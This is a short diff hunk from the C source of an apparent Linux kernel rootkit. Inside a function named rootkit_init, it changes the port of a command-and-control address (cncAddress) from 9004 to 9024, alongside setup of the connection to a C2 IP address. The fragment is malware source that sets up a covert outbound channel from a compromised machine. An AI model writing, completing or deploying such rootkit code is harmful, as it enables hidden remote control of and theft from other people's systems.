@@ -180,7 +180,7 @@ static int __init rootkit_init(void)
     struct sockaddr_in cncAddress;
     memset(&cncAddress, 0, sizeof(cncAddress));
     cncAddress.sin_family = AF_INET;
-    cncAddress.sin_port = htons(9004);
+    cncAddress.sin_port = htons(9024);
     cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);
 
     memset(&msg, 0x00, sizeof(msg));
